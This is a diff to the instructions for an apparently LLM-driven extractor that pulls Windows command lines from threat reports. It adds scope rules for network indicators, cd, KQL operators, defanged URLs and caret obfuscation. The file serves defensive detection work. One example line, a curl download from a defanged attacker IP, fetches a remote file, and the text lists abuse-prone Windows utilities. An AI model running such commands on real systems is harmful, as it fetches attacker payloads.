@@ -22,7 +22,10 @@ This extractor only covers single-line Windows command lines. It does NOT cover
 parent-child process trees, bare registry keys/values, service artifacts, scheduled-task
 artifacts, or the finished detection-logic artifact itself (the Sigma / KQL / SPL / EQL / XQL
 rule or query). A command line stated INSIDE a rule/query IS extractable — see the
-COMPLETE-ARTIFACT RULE. Other out-of-scope items should be ignored.
+COMPLETE-ARTIFACT RULE. It also does NOT extract standalone network indicators (domains, IPs,
+ports, URLs, URI paths, or User-Agent strings); NetworkIndicatorExtract owns those. Extract the
+FULL command line that contains one, and leave the embedded indicator value to NetworkIndicatorExtract.
+Other out-of-scope items should be ignored.
 
 ## INPUT (flexible)
 I will give you ONE of the following each turn:
@@ -48,7 +51,7 @@ A command is VALID only if ALL conditions hold.
 ### 2. Windows execution component (first token)
 - Executable file: *.exe, *.bat, *.cmd, *.vbs, *.js, *.ps1, *.wsf, *.hta.
 - Shell: cmd.exe, powershell.exe, pwsh.exe.
-- Built-in: dir, cd, copy, move, echo, mkdir, ren, type, del, md, rd, set, etc.
+- Built-in: dir, copy, move, echo, mkdir, ren, type, del, md, rd, set, etc.
 - LOLBin / utility (illustrative, not exhaustive): net, nltest, reg, wmic, schtasks, whoami,
   ipconfig, systeminfo, certutil, bitsadmin, mshta, regsvr32, rundll32, wscript, cscript,
   msiexec, sc, taskkill, psexec, adfind, vssadmin, wevtutil, netsh, route, arp, nslookup,
@@ -92,9 +95,12 @@ Do NOT extract:
 - Bare commands with no arguments/syntax: whoami, ipconfig, hostname.
 - Chains with zero non-trivial components: whoami & hostname.
 - Single-token commands (no spaces).
-- Multi-line commands, visually wrapped commands, commands using continuation chars
-  (^, PowerShell backtick).
+- Multi-line commands, visually wrapped commands, or commands with a continuation character at the END
+  of a physical line (^ in cmd, PowerShell backtick).
 - Commands that require reconstruction from multiple lines or fields.
+- cd <path>: SKIP. A standalone cd changes process-local shell state only and leaves no observable
+  artifact in any telemetry channel. Built-ins remain valid when their invocation produces an observable
+  effect, such as a file being created, written, deleted, or renamed (dir > x, del, copy, ren, and mkdir).
 - Behavioral descriptions, summaries, hypotheticals ("attackers could run…",
   "a possible command…").
 - Commands inside malware source code (C, C++, Python, Go, Rust, .NET, VB).
@@ -117,7 +123,7 @@ never a predicate over the command. Two signals decide, in order:
 1. Matching operator (primary) — the operator discloses fidelity.
    - EXTRACTABLE (full value): Sigma default match or `|equals`; KQL `==` / `=~`; SPL exact match.
    - SKIP (fragment): `|contains`, `|contains|all`, `|startswith`, `|endswith`, `|re`;
-     KQL `contains` / `has` / `matches regex` / `startswith` / `endswith`; SPL `*wildcard*` / `like` / `rex`.
+     KQL `contains` / `has` / `hasprefix` / `matches regex` / `startswith` / `endswith`; SPL `*wildcard*` / `like` / `rex`.
 2. Value shape (fallback when the operator is ambiguous) — does the matched string, on its own,
    satisfy POSITIVE EXTRACTION SCOPE? If yes -> extract; if it is a keyword / substring / regex -> SKIP.
 
@@ -147,6 +153,11 @@ observability, not interestingness.
   (including semicolons).
 - Do NOT expand abbreviations or environment variables.
 - Preserve obfuscated or encoded content exactly (including base64 blobs).
+- Strip enclosing < > from a defanged URL inside a command line -- the angle brackets are a
+  source-rendering artifact, not typed input. Preserve hxxp://, [.], and every other defanging
+  convention verbatim.
+  Example: curl -o sh2.txt <hxxp://173.254.204[.]72/sh2.txt>  ->  extract
+           curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt
 
 ### Wrapper handling (strict and limited)
 - Wrapper stripping applies ONLY to cmd.exe and %COMSPEC% with /c or /k:
@@ -162,7 +173,9 @@ observability, not interestingness.
 ## MULTI-LINE HANDLING
 - Commands are single-line only.
 - If a command is split across multiple physical lines -> SKIP.
-- Continuation characters (^ in cmd, backtick in PowerShell) -> SKIP.
+- A continuation character at the END of a physical line (^ in cmd, backtick in PowerShell) -> SKIP.
+  A mid-token caret on a single line (c^ur^l, p^rin^ce) is cmd escape-character obfuscation: preserve it
+  verbatim per FIDELITY, and extract the command when it otherwise qualifies.
 - Do NOT concatenate lines to form a command.
 
 ## COUNT SEMANTICS
